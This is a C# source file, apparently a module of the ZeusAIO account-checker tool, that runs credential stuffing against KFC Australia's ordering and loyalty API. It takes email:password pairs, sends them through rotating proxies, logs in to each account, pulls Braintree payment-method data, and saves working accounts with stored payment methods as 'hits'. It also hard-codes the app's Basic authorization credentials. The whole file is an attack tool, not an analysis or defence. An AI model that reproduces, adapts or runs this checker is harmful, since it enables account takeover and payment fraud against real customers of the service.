using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using System.Security.Authentication;
using System.Net;
using checker;

namespace Kfc
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            StringBuilder capture = new StringBuilder();
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.AddHeader("X-Api-AppVersion", "19.9.2.0");
                            req.AddHeader("X-Api-Channel", "Android App");
                            req.AddHeader("X-Api-AppPlatform", "5");
                            req.AddHeader("x-api-custom-auth", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                            req.AddHeader("X-Api-CompanyCode", "KFAU001");
                            req.AddHeader("Authorization", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                            req.AddHeader("Connection", "Keep-Alive");
                            req.AddHeader("Accept-Encoding", "gzip");
                            req.AddHeader("User-Agent", "okhttp/3.9.1");

                            var res0 = req.Get("https://nolo-api-ssa.ncrsaas.com/v1/loyaltyproxy/YAM02/company/profileconfiguration");
                            string text0 = res0.ToString();

                            req.AddHeader("X-Api-AppVersion", "19.9.2.0");
                            req.AddHeader("X-Api-Channel", "Android App");
                            req.AddHeader("X-Api-AppPlatform", "5");
                            req.AddHeader("x-api-custom-auth", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                            req.AddHeader("X-Api-CompanyCode", "KFAU001");
                            req.AddHeader("Authorization", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                            req.AddHeader("Connection", "Keep-Alive");
                            req.AddHeader("Accept-Encoding", "gzip");
                            req.AddHeader("User-Agent", "okhttp/3.9.1");

                            var res1 = req.Post("https://nolo-api-ssa.ncrsaas.com/v1/Authenticate/2FA", "{\"Email\":\"" + s[0] + "\",\"Password\":\"" + s[1] + "\"}", "application/json");
                            string text1 = res1.ToString();

                            if (text1.Contains("{\"$id\":\"1\",\"access_token\":\""))
                            {
                                var haha = Functions.LR(text1, "\"id_token\":\"", "\"").FirstOrDefault();
                                var haha2 = Functions.Base64Decode("" + haha + "");
                                var client = Functions.LR("" + haha2 + "", "\"CustomerId\":\"", "\"").FirstOrDefault();
                                var numb = Functions.LR("" + haha2 + "", "\"LoyaltyId\":\"", "\"").FirstOrDefault();
                                req.AddHeader("X-Api-AppVersion", "19.9.2.0");
                                req.AddHeader("X-Api-Channel", "Android App");
                                req.AddHeader("X-Api-AppPlatform", "5");
                                req.AddHeader("x-api-custom-auth", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                                req.AddHeader("X-Api-CompanyCode", "KFAU001");
                                req.AddHeader("Authorization", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                                req.AddHeader("Connection", "Keep-Alive");
                                req.AddHeader("Accept-Encoding", "gzip");
                                req.AddHeader("User-Agent", "okhttp/3.9.1");

                                var res2 = req.Post("https://nolo-api-ssa.ncrsaas.com/v1/Customers/Braintree/OneTimeToken", "{\"CustomerId\":\"" + client + "\",\"SiteId\":196}", "application/json");
                                string text2 = res2.ToString();

                                var xx = Functions.LR(text2, "\"", "\"").FirstOrDefault();
                                var auths = Functions.Base64Decode("" + xx + "");
                                var fingers = Functions.LR("" + auths + "", "authorizationFingerprint\":\"", "?customer_id=").FirstOrDefault();
                                req.AllowAutoRedirect = false;
                                req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0");
                                req.AddHeader("Accept", "*/*");
                                req.AddHeader("Accept-Language", "en-US,en;q=0.5");
                                req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                req.AddHeader("Origin", "https://order.kfc.com.au");
                                req.AddHeader("Referer", "https://order.kfc.com.au/");
                                req.AddHeader("Connection", "keep-alive");

                                var res3 = req.Get("https://api.braintreegateway.com/merchants/bhgb6k22pw4bdyc3/client_api/v1/payment_methods?defaultFirst=1&braintreeLibraryVersion=braintree%2Fweb%2F3.37.0&_meta%5BmerchantAppId%5D=order.kfc.com.au&_meta%5Bplatform%5D=web&_meta%5BsdkVersion%5D=3.37.0&_meta%5Bsource%5D=client&_meta%5Bintegration%5D=custom&_meta%5BintegrationType%5D=custom&_meta%5BsessionId%5D=95d6d73f-40dd-4849-8743-e18af7e36ab9&authorizationFingerprint=" + fingers + "%3Fcustomer_id%3D");
                                string text3 = res3.ToString();

                                var payment = Functions.LR(text3, "{\"paymentMethods\":[{\"", "}").FirstOrDefault();
                                capture.Append(" | payment = " + payment);
                                req.AddHeader("X-Api-AppVersion", "19.9.2.0");
                                req.AddHeader("X-Api-Channel", "Android App");
                                req.AddHeader("X-Api-AppPlatform", "5");
                                req.AddHeader("x-api-custom-auth", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                                req.AddHeader("X-Api-CompanyCode", "KFAU001");
                                req.AddHeader("Authorization", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                                req.AddHeader("Connection", "Keep-Alive");
                                req.AddHeader("Accept-Encoding", "gzip");
                                req.AddHeader("User-Agent", "okhttp/3.9.1");

                                var res4 = req.Get("https://nolo-api-ssa.ncrsaas.com/v1/loyaltyproxy/YAM02/members/" + numb + "/extendedstandings");
                                string text4 = res4.ToString();

                                if (payment.Any())
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - Kfc] - " + s[0] + ":" + s[1] + " | " + capture.ToString(), Color.Green);
                                    }
                                    Export.AsResult("/KfcAus_hits", s[0] + ":" + s[1] + " | " + capture.ToString());
                                    return false;
                                }
                                else if (text4.Contains("rewardName\":\"20% Employee Discount\",\"bprewardThreshold\":1.0,\"tierID\":5,\"rewardType\":\"Real-Time Discount\"}],\"availableRewards\":[]") || numb.Contains("\",") || !( numb.Any()))
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - Kfc] - " + s[0] + ":" + s[1] + " | " + capture.ToString(), Color.OrangeRed);
                                    }
                                    Export.AsResult("/KfcAus_frees", s[0] + ":" + s[1] + " | " + capture.ToString());
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                            else if (!text1.Contains("{\"$id\":\"1\",\"access_token\":\""))
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }


                        }

                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}
